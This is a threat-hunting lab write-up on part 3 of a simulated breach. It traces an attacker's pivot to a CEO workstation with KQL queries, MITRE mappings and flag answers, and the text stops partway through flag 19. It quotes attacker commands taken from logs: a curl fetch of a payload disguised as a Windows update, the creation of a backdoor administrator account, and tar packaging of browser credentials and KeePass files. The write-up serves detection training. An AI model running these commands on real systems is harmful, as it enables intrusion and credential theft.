# THE AZUKI BREACH SAGA - Part 3: Bridge Takeover

<img width="740" height="1110" alt="image" src="https://github.com/user-attachments/assets/db319807-9d6c-4e96-9490-142e2390f973" />

## Executive Summary

This report documents the findings from Part 3 of the threat hunting investigation conducted on Azuki Import/Export Trading Co. Two days after the file server breach (November 22), threat actors returned on November 25 and pivoted from the compromised IT workstation to the CEO's administrative PC (azuki-adminpc). The attacker deployed sophisticated tools, including Meterpreter (Metasploit C2 beacon) and a custom implant named `silentlynx.exe`, directly linking this intrusion to the JADE SPIDER threat actor.

The investigation revealed extensive credential theft targeting browser-saved passwords, KeePass password databases, and plaintext password files. The attacker exfiltrated 8 archives containing financial records, banking information, tax documents, business contracts, and credentials to an anonymous file sharing service (gofile.io).

---

## Scenario Overview

### Incident Brief

| Field | Detail |
|-------|--------|
| Company | Azuki Import/Export Trading Co. (梓貿易株式会社) |
| Situation | Two days after the file server breach, threat actors returned with sophisticated tools and pivoted to the CEO's administrative PC, deploying persistent backdoors and exfiltrating sensitive business data |
| Compromised Systems | azuki-sl (breachhead), azuki-fileserver01 (file server), azuki-adminpc (CEO PC) |
| Evidence Available | Microsoft Defender for Endpoint logs (via Azure Log Analytics) |

### Investigation Scope

| Parameter | Value |
|-----------|-------|
| Time Period | November 24 - December 6, 2025 |
| Active Attack Period | November 25, 2025, 4:06 AM - 6:10 AM |
| Target Device | azuki-adminpc |
| Data Source | Microsoft Defender for Endpoint logs (Azure Log Analytics) |

> **Note:** The investigation scope for Part 3 begins November 24, 2025. The active attack period was confined to November 25, 2025, with the attacker completing their operations within approximately 2 hours.

### Supporting Documents

- [Attack Timeline](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-3-bridge-takeover/docs/chronological-timeline.md) - Chronological breakdown of attacker activity
- [Indicators of Compromise](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-3-bridge-takeover/docs/indicators-of-compromise.md) - Complete IOC list with detection signatures

### Connection to Previous Parts

| Part | Date | Target | Key Activity |
|------|------|--------|--------------|
| Part 1 | November 19, 2025 | azuki-sl | Initial access, credential theft, persistence |
| Part 2 | November 22, 2025 | azuki-fileserver01 | File server compromise, data exfiltration |
| Part 3 | November 25, 2025 | azuki-adminpc | CEO PC compromise, extensive credential theft |

---

## Findings

### Flag 1: Lateral Movement - Source System

**Objective:** Identify the source IP address for lateral movement to the admin PC.

**Query Used:**
```kql
DeviceLogonEvents
| where TimeGenerated >= datetime(2025-11-24)
| where RemoteIP == "10.1.0.204" or RemoteDeviceName contains "azuki-sl"
| where ActionType == "LogonSuccess"
| order by TimeGenerated asc
| project TimeGenerated, DeviceName, AccountName, RemoteIP, RemoteDeviceName, LogonType
```

<img width="1200" alt="1 2 3" src="https://github.com/user-attachments/assets/7882d474-58fa-4223-a7cc-80670b21f685" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:06:41 AM |
| Source IP | 10.1.0.204 |
| Source Device | azuki-sl |
| Target Device | azuki-adminpc |
| Account Used | yuki.tanaka |
| Logon Type | Network → RemoteInteractive |

**Analysis:**

The lateral movement to the CEO's admin PC originated from IP address 10.1.0.204, which is the IT admin workstation (azuki-sl) compromised during Part 1. This confirms that azuki-sl continues to serve as the attacker's primary breachhead for pivoting to other systems within the network. The attacker accessed the admin PC multiple times throughout the morning (4:06 AM, 4:31 AM, 5:21 AM, 6:06 AM), suggesting phased operations to avoid detection or accommodate large data transfers.

**MITRE ATT&CK Reference:**
- Lateral Movement (TA0008)
- Remote Services: Remote Desktop Protocol (T1021.001)

**Flag Answer:** `10.1.0.204`

---

### Flag 2: Lateral Movement - Compromised Credentials

**Objective:** Identify the compromised account used for lateral movement.

**Reference:** This finding was derived from the same query results as Flag 1.

<img width="1200" alt="1 2 3" src="https://github.com/user-attachments/assets/7882d474-58fa-4223-a7cc-80670b21f685" />


**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:06:41 AM |
| Account | yuki.tanaka |
| Target Device | azuki-adminpc |
| Source Device | azuki-sl (10.1.0.204) |

**Analysis:**

The attacker used the `yuki.tanaka` account for lateral movement to the CEO's admin PC. This is a new compromised account not seen in Parts 1 or 2, where the attacker primarily used `kenji.sato` and `fileadmin`. The credentials were likely obtained from the `IT-Admin-Passwords.csv` file, which was discovered on the file server during Part 2.

**Compromised Accounts Across All Parts:**

| Part | Account | Used For |
|------|---------|----------|
| Part 1 | kenji.sato | Initial access to azuki-sl |
| Part 1 | support | Backdoor account created |
| Part 2 | fileadmin | Lateral movement to file server |
| Part 3 | yuki.tanaka | Lateral movement to CEO admin PC |

**MITRE ATT&CK Reference:**
- Valid Accounts (T1078)

**Flag Answer:** `yuki.tanaka`

---

### Flag 3: Lateral Movement - Target Device

**Objective:** Identify the target device for lateral movement.

**Reference:** This finding was derived from the same query results as Flag 1.

<img width="1200" alt="1 2 3" src="https://github.com/user-attachments/assets/7882d474-58fa-4223-a7cc-80670b21f685" />

**Finding:**

| Field | Value |
|-------|-------|
| Target Device | azuki-adminpc |
| Target IP | 10.1.0.188 |
| Account Used | yuki.tanaka |

**Analysis:**

The attacker moved laterally to `azuki-adminpc`, which, based on the naming convention, is the CEO's administrative workstation. This represents a significant escalation in the attack, as executive workstations typically contain highly sensitive business information including strategic documents, financial data, confidential communications, and password databases.

**Compromised Systems Across All Parts:**

| Part | Device | Role |
|------|--------|------|
| Part 1 | azuki-sl | IT admin workstation (breachhead) |
| Part 2 | azuki-fileserver01 | File server |
| Part 3 | azuki-adminpc | CEO/Admin PC |

**MITRE ATT&CK Reference:**
- Remote Services: Remote Desktop Protocol (T1021.001)
- System Information Discovery (T1082)

**Flag Answer:** `azuki-adminpc`

---

### Flag 4: Execution - Payload Hosting Service

**Objective:** Identify the file hosting service used to stage malware.

**Query Used:**
```kql
DeviceNetworkEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where RemoteUrl != ""
| where InitiatingProcessCommandLine has_any ("curl", "wget", "url", "powershell")
| order by TimeGenerated asc
| project TimeGenerated, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP
```

<img width="1200" alt="4 5" src="https://github.com/user-attachments/assets/61b3b385-100e-4919-982c-d57fa5588b11" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:21:12 AM |
| Hosting Service | litter.catbox.moe |
| Remote IP | 108.181.20.36 |
| Download Command | `curl.exe -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z` |

**Analysis:**

The attacker used `litter.catbox.moe`, an anonymous file hosting service, to stage malware for download. This is a different service from Part 2 (file.io), demonstrating the attacker's practice of rotating infrastructure between operations. The downloaded file was disguised as a Windows update (`KB5044273-x64.7z`), a common masquerading technique.

**MITRE ATT&CK Reference:**
- Stage Capabilities: Upload Malware (T1608.001)
- Ingress Tool Transfer (T1105)

**Flag Answer:** `litter.catbox.moe`

---

### Flag 5: Execution - Malware Download Command

**Objective:** Identify the command used to download the malicious archive.

**Reference:** This finding was derived from the same query results as Flag 4.

<img width="1200" alt="4 5" src="https://github.com/user-attachments/assets/61b3b385-100e-4919-982c-d57fa5588b11" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:21:12 AM |
| Command | `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z` |
| Account | yuki.tanaka |

**Analysis:**

The attacker used `curl.exe` to download a malicious archive from the anonymous file hosting service. The command-line arguments reveal the methodology:

| Argument | Purpose |
|----------|---------|
| `-L` | Follow redirects |
| `-o` | Output to specified file path |
| `C:\Windows\Temp\cache\` | Download location (Temp folder) |
| `KB5044273-x64.7z` | Filename disguised as Windows security update |

The downloaded file was named to masquerade as a legitimate Windows update (KB5044273), a common technique to avoid suspicion during casual inspection. The use of a `.7z` archive format suggests the payload may contain multiple files or tools that will be extracted after download.

**MITRE ATT&CK Reference:**
- Ingress Tool Transfer (T1105)
- Masquerading: Match Legitimate Name or Location (T1036.005)

**Flag Answer:** `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`

---

### Flag 6: Execution - Archive Extraction Command

**Objective:** Identify the command used to extract the password-protected archive.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where ProcessCommandLine has_any ("7z", "extract", "rar")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="6" src="https://github.com/user-attachments/assets/3a44b0de-968f-45f3-b343-7030af4b4e5f" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:21:32 AM |
| Command | `"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y` |
| Account | yuki.tanaka |

**Analysis:**

The attacker used `7z.exe` to extract the password-protected archive just 20 seconds after downloading it. The command-line arguments reveal the methodology:

| Argument | Purpose |
|----------|---------|
| `x` | Extract with full paths |
| `-p********` | Password for encrypted archive (redacted in logs) |
| `-oC:\Windows\Temp\cache\` | Output directory |
| `-y` | Assume Yes to all prompts (silent extraction) |

The use of password-protected archives serves multiple evasion purposes: it prevents security tools from inspecting the archive contents during download, bypasses basic content inspection at network perimeters, and ensures only the attacker can extract the payload.

**Bonus Finding:** A second archive (`m-temp.7z`) was downloaded and extracted approximately 1.5 hours later, suggesting the attacker deployed additional tools during the operation.

**MITRE ATT&CK Reference:**
- Deobfuscate/Decode Files or Information (T1140)
- Ingress Tool Transfer (T1105)

**Flag Answer:** `"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y`

---

### Flag 7: Persistence - C2 Implant

**Objective:** Identify the C2 beacon filename.

**Query Used:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where FolderPath contains "cache"
| where FileName endswith ".exe"
| order by TimeGenerated asc
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName
```

<img width="1200" alt="7" src="https://github.com/user-attachments/assets/4b8d8fba-695b-40cc-9797-8def065c7716" />

**Finding:**

| Timestamp | Filename | Purpose |
|-----------|----------|---------|
| Nov 25, 4:21:33 AM | m.exe | Mimikatz (credential theft) |
| Nov 25, 4:21:33 AM | meterpreter.exe | Metasploit C2 beacon |
| Nov 25, 4:21:33 AM | silentlynx.exe | Custom JADE SPIDER implant |
| Nov 25, 5:58:27 AM | PsExec64.exe | Sysinternals remote execution |

**Analysis:**

The archive contained multiple offensive security tools, with `meterpreter.exe` being the C2 beacon. Meterpreter is a well-known payload from the Metasploit Framework that provides attackers with an interactive shell and extensive post-exploitation capabilities including file system access, credential harvesting, privilege escalation, and lateral movement.

**Tools Extracted from Archive:**

| Filename | Purpose |
|----------|---------|
| **meterpreter.exe** | Metasploit C2 beacon |
| m.exe | Likely Mimikatz (credential dumping) |
| silentlynx.exe | Custom JADE SPIDER implant (matches threat actor alias) |
| PsExec64.exe | Sysinternals remote execution tool |

The presence of `silentlynx.exe` is particularly notable as "SilentLynx" is a known alias for JADE SPIDER, confirming threat actor attribution. The attacker also demonstrated anti-forensic behavior by deleting tools after use (m.exe and PsExec64.exe).

**MITRE ATT&CK Reference:**
- Command and Scripting Interpreter (T1059)
- Command and Control (TA0011)

**Flag Answer:** `meterpreter.exe`

---

### Flag 8: Persistence - Named Pipe

**Objective:** Identify the named pipe created by the C2 implant.

**Query Used:**
```kql
DeviceEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:21:33Z')
| where ActionType contains "Pipe"
| extend PipeName = parse_json(AdditionalFields).PipeName
| order by TimeGenerated asc
| project TimeGenerated, ActionType, PipeName, InitiatingProcessFileName, InitiatingProcessAccountName
```

<img width="1200" alt="8" src="https://github.com/user-attachments/assets/47e6b0fe-0e44-426f-b104-aaf8a2505915" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:24:35 AM |
| Named Pipe | \Device\NamedPipe\msf-pipe-5902 |
| Process | meterpreter.exe |

**Analysis:**

The Meterpreter C2 implant created a named pipe `\Device\NamedPipe\msf-pipe-5902` approximately 3 minutes after extraction. The pipe name follows a distinctive pattern:

| Component | Meaning |
|-----------|---------|
| `msf` | Metasploit Framework |
| `pipe` | Named pipe identifier |
| `5902` | Random/session identifier |

Named pipes are used by Meterpreter for inter-process communication, enabling features like token manipulation, privilege escalation, and pivoting. The `msf-pipe-*` naming pattern is a well-known behavioral indicator for Metasploit-based implants and can be used for detection rules.

The other named pipes in the results (`mojo.*`, `crashpad_*`) are legitimate Windows/Edge processes and can be filtered out as noise.

**MITRE ATT&CK Reference:**
- Internal Proxy (T1090.001)
- Inter-Process Communication (T1559)

**Flag Answer:** `\Device\NamedPipe\msf-pipe-5902`

---

### Flag 9: Credential Access - Decoded Account Creation

**Objective:** Identify the decoded Base64 command used for account creation.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where FileName == "powershell.exe"
| where ProcessCommandLine has_any ("-enc", "-EncodedCommand", "FromBase64", "-e ")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, ProcessCommandLine
```

<img width="1200" alt="9 10 11" src="https://github.com/user-attachments/assets/cbd397f1-43bd-4969-8bb1-082c8a4cdd81" />

**Finding:**

| Timestamp | Encoded Command | Decoded Command |
|-----------|-----------------|-----------------|
| Nov 25, 4:51:08 AM | `bgBlAHQAIAB1AHMAZQByAC...` | `net user yuki.tanaka2 B@ckd00r2024! /add` |
| Nov 25, 4:51:23 AM | `bgBlAHQAIABsAG8AYwBhAG...` | `net localgroup Administrators yuki.tanaka2 /add` |

**Analysis:**

The attacker used Base64-encoded PowerShell commands to obfuscate account creation activity. When decoded, the commands reveal the creation of a backdoor account:

1. **Create account:** `net user yuki.tanaka2 B@ckd00r2024! /add`
2. **Add to Administrators:** `net localgroup Administrators yuki.tanaka2 /add`

The account naming convention (`yuki.tanaka2`) is designed to blend in with the legitimate compromised account (`yuki.tanaka`), making it harder to detect during casual review. The password `B@ckd00r2024!` follows common complexity requirements while being easily remembered by the attacker.

This is similar to Part 1, where the attacker created the `support` backdoor account, demonstrating consistent persistence methodology across the intrusion.

**MITRE ATT&CK Reference:**
- Obfuscated Files or Information (T1027)
- Create Account: Local Account (T1136.001)

**Flag Answer:** `net user yuki.tanaka2 B@ckd00r2024! /add`

---

### Flag 10: Persistence - Backdoor Account

**Objective:** Identify the backdoor account name.

**Reference:** This finding was derived from the decoded Base64 commands in Flag 9.

<img width="1200" alt="9 10 11" src="https://github.com/user-attachments/assets/cbd397f1-43bd-4969-8bb1-082c8a4cdd81" />

**Finding:**

| Field | Value |
|-------|-------|
| Backdoor Account | yuki.tanaka2 |
| Password | B@ckd00r2024! |
| Privilege | Added to Administrators group |

**Analysis:**

The attacker created a backdoor account named `yuki.tanaka2` that closely mimics the legitimate compromised account `yuki.tanaka`. This naming convention is a deliberate attempt to blend in with existing accounts and avoid detection during casual review of user lists.

**Backdoor Accounts Across All Parts:**

| Part | Account | Device | Naming Strategy |
|------|---------|--------|-----------------|
| Part 1 | support | azuki-sl | Generic IT support name |
| Part 3 | yuki.tanaka2 | azuki-adminpc | Mimic existing user |

The evolution in naming strategy shows increased sophistication - while `support` might raise questions during an audit, `yuki.tanaka2` could easily be mistaken for a secondary account belonging to the legitimate user or a test account.

**MITRE ATT&CK Reference:**
- Create Account: Local Account (T1136.001)
- Account Manipulation (T1098)

**Flag Answer:** `yuki.tanaka2`

---

### Flag 11: Persistence - Decoded Privilege Escalation Command

**Objective:** Identify the decoded Base64 command for privilege escalation.

**Reference:** This finding was derived from the same query results as Flag 9.

<img width="1200" alt="9 10 11" src="https://github.com/user-attachments/assets/cbd397f1-43bd-4969-8bb1-082c8a4cdd81" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:51:23 AM |
| Decoded Command | `net localgroup Administrators yuki.tanaka2 /add` |

**Analysis:**

The attacker used a Base64-encoded PowerShell command to add the newly created backdoor account (`yuki.tanaka2`) to the local Administrators group. This two-step process (create account, then elevate) occurred within 15 seconds:

| Timestamp | Action | Decoded Command |
|-----------|--------|-----------------|
| 4:51:08 AM | Create account | `net user yuki.tanaka2 B@ckd00r2024! /add` |
| 4:51:23 AM | Elevate privileges | `net localgroup Administrators yuki.tanaka2 /add` |

By adding the account to the Administrators group, the attacker ensures they have full administrative control over the system, enabling them to install additional tools, access sensitive data, and maintain persistent access even if other footholds are discovered.

**MITRE ATT&CK Reference:**
- Valid Accounts: Local Accounts (T1078.003)
- Obfuscated Files or Information (T1027)

**Flag Answer:** `net localgroup Administrators yuki.tanaka2 /add`

---

### Flag 12: Discovery - Session Enumeration

**Objective:** Identify the command used to enumerate RDP sessions.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where ProcessCommandLine has_any ("quser", "qwinsta", "query user", "query session")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="12" src="https://github.com/user-attachments/assets/d1e5030a-482f-4f1e-acaa-a44dabe4f548" />

**Finding:**

| Timestamp | Command | Purpose |
|-----------|---------|---------|
| Nov 25, 4:08:58 AM | `"qwinsta.exe"` | Query RDP sessions |
| Nov 25, 4:09:07 AM | `"quser.exe"` | Query logged-on users |

**Analysis:**

The attacker executed `qwinsta.exe` to enumerate active Remote Desktop sessions on the admin PC, followed by `quser.exe` to identify logged-on users. These commands were executed just 2 minutes after the initial lateral movement to azuki-adminpc (4:06 AM), as part of the discovery phase.

| Command | Full Name | Information Revealed |
|---------|-----------|---------------------|
| `qwinsta` | Query Window Station | Session names, usernames, session IDs, state (active/disconnected) |
| `quser` | Query User | Usernames, session names, logon time, idle time |

This reconnaissance helps the attacker understand who is actively using the system, identify high-value targets, determine if their activity might be noticed, and decide optimal timing for further actions.

**MITRE ATT&CK Reference:**
- System Owner/User Discovery (T1033)

**Flag Answer:** `qwinsta`

---

### Flag 13: Discovery - Domain Trust Enumeration

**Objective:** Identify the command used to enumerate domain trusts.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where ProcessCommandLine has_any ("nltest", "domain_trusts", "Get-ADTrust", "trustedDomain")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="13" src="https://github.com/user-attachments/assets/9d94613e-4e8f-49e2-8d7b-b45be5bd0ae5" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:09:25 AM |
| Command | `"nltest.exe" /domain_trusts /all_trusts` |

**Analysis:**

The attacker used `nltest.exe` with the `/domain_trusts /all_trusts` parameters to enumerate all domain trust relationships. The command was executed twice within 13 seconds, possibly due to timeout or verification.

| Parameter | Purpose |
|-----------|---------|
| `/domain_trusts` | Query domain trust relationships |
| `/all_trusts` | Include all trust types (parent, child, external, forest) |

This reconnaissance reveals:
- Trusted domains and forests
- Trust direction (inbound, outbound, bidirectional)
- Trust types (parent-child, external, forest)
- Potential paths for lateral movement to other domains

The timing shows this was part of the early discovery phase, executed just 3 minutes after initial access (4:06 AM) and immediately after session enumeration (4:09 AM).

**MITRE ATT&CK Reference:**
- Domain Trust Discovery (T1482)

**Flag Answer:** `"nltest.exe" /domain_trusts /all_trusts`

---

### Flag 14: Discovery - Network Connection Enumeration

**Objective:** Identify the command used to enumerate network connections.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where ProcessCommandLine has_any ("netstat")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="14" src="https://github.com/user-attachments/assets/60376de7-1752-4a2f-94c3-fc97e953cd3d" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:10:07 AM |
| Command | `"NETSTAT.EXE" -ano` |

**Analysis:**

The attacker used `netstat.exe` with the `-ano` flags to enumerate active network connections on the admin PC. The command-line arguments reveal the methodology:

| Flag | Purpose |
|------|---------|
| `-a` | Display all connections and listening ports |
| `-n` | Show addresses and port numbers in numerical form (no DNS resolution) |
| `-o` | Display the owning process ID (PID) for each connection |

This command provides the attacker with:
- Active inbound and outbound connections
- Listening services and their ports
- Process IDs associated with each connection
- Potential lateral movement targets on the network

The timing shows this was part of the systematic discovery phase, executed approximately 4 minutes after initial access and following session and domain trust enumeration.

**Discovery Sequence on azuki-adminpc:**

| Timestamp | Command | Purpose |
|-----------|---------|---------|
| 4:08:58 AM | `qwinsta` | RDP session enumeration |
| 4:09:07 AM | `quser` | User enumeration |
| 4:09:25 AM | `nltest /domain_trusts /all_trusts` | Domain trust enumeration |
| 4:10:07 AM | `netstat -ano` | Network connection enumeration |

**MITRE ATT&CK Reference:**
- System Network Connections Discovery (T1049)

**Flag Answer:** `"NETSTAT.EXE" -ano`

---

### Flag 15: Discovery - Password Database Search

**Objective:** Identify the command used to search for password databases.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where ProcessCommandLine has_any ("dir", "Get-ChildItem", "where", "kdbx", "kdb", "psafe", ".1pif")
| where ProcessCommandLine has_any ("/s", "-Recurse", "/r")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="15" src="https://github.com/user-attachments/assets/be1feb18-4fe6-4c3b-be60-c3d0f86116f0" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:13:45 AM |
| Command | `where /r C:\Users *.kdbx` |

**Analysis:**

The attacker used the `where` command to recursively search for KeePass password database files across all user directories. The command-line arguments reveal the methodology:

| Argument | Purpose |
|----------|---------|
| `/r` | Recursive search through subdirectories |
| `C:\Users` | Starting directory (all user profiles) |
| `*.kdbx` | KeePass database file extension |

KeePass is a popular open-source password manager, and `.kdbx` files contain encrypted password vaults that may store credentials for:
- Corporate applications and systems
- Network devices and infrastructure
- Cloud services and SaaS platforms
- Backup server credentials
- Personal accounts

If the attacker finds a KeePass database and can obtain or crack the master password, they gain access to all stored credentials, potentially enabling further lateral movement and privilege escalation.

**Discovery Timeline on azuki-adminpc:**

| Timestamp | Command | Purpose |
|-----------|---------|---------|
| 4:08:58 AM | `qwinsta` | RDP session enumeration |
| 4:09:07 AM | `quser` | User enumeration |
| 4:09:25 AM | `nltest /domain_trusts /all_trusts` | Domain trust enumeration |
| 4:10:07 AM | `netstat -ano` | Network connection enumeration |
| 4:13:45 AM | `where /r C:\Users *.kdbx` | Password database search |

**MITRE ATT&CK Reference:**
- Unsecured Credentials: Credentials In Files (T1552.001)

**Flag Answer:** `where /r C:\Users *.kdbx`

---

### Flag 16: Discovery - Credential File

**Objective:** Identify the discovered password file.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where InitiatingProcessRemoteSessionIP == "10.1.0.204"
| where ProcessCommandLine has_any (".txt", ".lnk")
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, ProcessCommandLine
```

<img width="1200" alt="16" src="https://github.com/user-attachments/assets/a9321719-7d3c-4b26-b4e5-769cf082a57c" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:15:52 AM |
| Filename | OLD-Passwords.txt |
| Path | C:\Users\yuki.tanaka\Desktop\OLD-Passwords.txt |

**Analysis:**

The attacker discovered and opened a plaintext password file named `OLD-Passwords.txt` on the user's desktop. This represents a critical security hygiene failure - storing passwords in unencrypted text files. The "OLD" prefix suggests these may be legacy credentials that users often forget to delete, but they could still provide access to systems where passwords haven't been rotated.

**Bonus Findings - Additional Credential Theft Activity:**

The query results reveal extensive credential collection activity:

| Timestamp | Command | Data Collected |
|-----------|---------|----------------|
| 4:15:52 AM | `notepad.exe OLD-Passwords.txt` | Legacy password file |
| 4:39:16 AM | `tar.exe -czf credentials.tar.gz Azuki-Passwords.kdbx KeePass-Master-Password.txt` | KeePass database + master password |
| 4:48:25 AM | `tar.exe -czf chrome-credentials.tar.gz chrome-creds.txt Chrome-Login-Data.db` | Chrome saved passwords |
| 5:56:42 AM | `tar.exe -czf chrome-session-theft.tar.gz chrome-real-dump.txt Chrome-Cookies.db` | Chrome session cookies |

This reveals a catastrophic security failure - not only was there a KeePass database, but the master password was stored in a plaintext file (`KeePass-Master-Password.txt`) alongside it, completely defeating the purpose of using a password manager.

**MITRE ATT&CK Reference:**
- Unsecured Credentials: Credentials In Files (T1552.001)

**Flag Answer:** `OLD-Passwords.txt`

---

### Flag 17: Collection - Data Staging Directory

**Objective:** Identify the data staging directory.

**Query Used:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:06:41Z')
| where ActionType == "FileCreated"
| where FileName endswith ".tar.gz" or FileName endswith ".zip" or FileName endswith ".7z"
| order by TimeGenerated asc
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName
```

<img width="1200" alt="17" src="https://github.com/user-attachments/assets/68ef64c9-f6c4-4c3c-b292-d96a56c83921" />

**Finding:**

| Field | Value |
|-------|-------|
| Staging Directory | C:\ProgramData\Microsoft\Crypto\staging |

**Archives Staged:**

| Filename | Category |
|----------|----------|
| Tax-Supporting-Docs-2024.zip | Tax records |
| All-Contracts-2022.zip | Business contracts |
| All-Contracts-2023.zip | Business contracts |
| credentials.tar.gz | Credentials |
| quickbooks-data.tar.gz | Financial/Accounting |
| banking-records.tar.gz | Banking information |
| tax-documents.tar.gz | Tax records |
| contracts-data.tar.gz | Business contracts |

**Analysis:**

The attacker established `C:\ProgramData\Microsoft\Crypto\staging` as the data staging directory on the CEO's admin PC. This path was strategically chosen to mimic legitimate Windows cryptographic service directories, making it less suspicious during casual inspection.

**Staging Directory Comparison Across Parts:**

| Part | Device | Staging Directory | Strategy |
|------|--------|-------------------|----------|
| Part 1 | azuki-sl | C:\ProgramData\WindowsCache | Custom hidden folder |
| Part 2 | azuki-fileserver01 | C:\Windows\Logs\CBS | Abuse existing Windows folder |
| Part 3 | azuki-adminpc | C:\ProgramData\Microsoft\Crypto\staging | Mimic legitimate crypto service |

The attacker used `robocopy.exe` for copying existing zip files and `tar.exe` for creating new compressed archives, demonstrating continued use of living-off-the-land techniques.

**MITRE ATT&CK Reference:**
- Data Staged: Local Data Staging (T1074.001)

**Flag Answer:** `C:\ProgramData\Microsoft\Crypto\staging`

---

### Flag 18: Collection - Automated Data Collection Command

**Objective:** Identify the command used to copy banking documents.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:06:41Z')
| where ProcessCommandLine has_any ("robocopy", "xcopy", "copy")
| where ProcessCommandLine has_any ("bank", "financial", "staging")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="18" src="https://github.com/user-attachments/assets/885a2659-471c-445f-addf-733d65691fdc" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:37:03 AM |
| Command | `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP` |

**Analysis:**

The attacker used `Robocopy.exe` (Robust File Copy) to systematically copy sensitive business data to the staging directory. The command-line flags reveal a methodology optimized for speed and reliability:

| Flag | Purpose |
|------|---------|
| `/E` | Copy subdirectories, including empty ones |
| `/R:1` | Retry only 1 time on failed copies (default is 1 million) |
| `/W:1` | Wait only 1 second between retries (default is 30 seconds) |
| `/NP` | No progress - don't display percentage copied (stealth) |

The `/R:1` and `/W:1` flags are significant - they reduce the default retry behavior to minimize time spent on locked or inaccessible files, allowing the attacker to quickly move through large datasets without getting stuck.

**Data Collection Sequence:**

| Timestamp | Source Folder | Data Type |
|-----------|---------------|-----------|
| 4:28:09 AM | Documents\QuickBooks | Financial/Accounting |
| 4:37:03 AM | Documents\Banking | Banking records |
| 4:37:22 AM | Documents\Tax-Records | Tax documents |
| 4:37:38 AM | Documents\Contracts | Business contracts |

**MITRE ATT&CK Reference:**
- Automated Collection (T1119)
- Data from Local System (T1005)

**Flag Answer:** `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP`

---

### Flag 19: Collection - Exfiltration Volume

**Objective:** Identify the total number of archives created.

**Query Used:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:06:41Z')
| where ActionType == "FileCreated"
| where FolderPath contains "staging"
| where FileName endswith ".tar.gz" or FileName endswith ".zip"
| summarize Count = count(), Archives = make_set(FileName)
```

<img width="1200" alt="19" src="https://github.com/user-attachments/assets/75ff38ed-2100-4838-9bfa-9ba9982d8946" />

**Finding:**

| Field | Value |
|-------|-------|
| Total Archives | 8 |

**Analysis:**

The attacker created 8 archives in the staging directory, representing a comprehensive theft of sensitive business data. The stolen data spans multiple categories:

| Category | Archives | Business Impact |
|----------|----------|-----------------|
| Financial/Banking | 2 | Banking records, QuickBooks accounting data |
